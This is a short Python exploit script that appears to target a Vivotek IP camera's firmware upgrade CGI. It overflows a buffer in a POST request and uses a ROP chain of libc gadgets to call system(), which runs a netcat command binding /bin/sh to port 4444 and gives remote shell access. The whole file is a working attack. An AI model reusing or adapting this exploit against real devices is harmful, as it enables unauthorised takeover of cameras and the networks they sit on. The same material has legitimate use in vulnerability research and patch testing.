# File: exp.py
# Author: raycp
# Date: 2019-07-07
# Description: exp for vivotek ip camera

from pwn import *

g1=0x00048784 #: pop {r1, pc}
g2=0x00016aa4 #: mov r0, r1 ; pop {r4, r5, pc}

p = remote("172.16.217.149",80)

libc_base=0x76f2d000
command_addr= 0x7effeb64
system_addr=0x76f74ab0 
g1=libc_base+g1
g2=libc_base+g2
prefix="POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:"
command="nc  -lp 4444 -e /bin/sh;"
payload='a'.ljust(52,'a')
payload=payload+p32(g1)+p32(command_addr)+p32(g2)+'a'*8+p32(system_addr)
payload=prefix+payload+command+"\n\r\n\r\n"
p.sendline(payload)
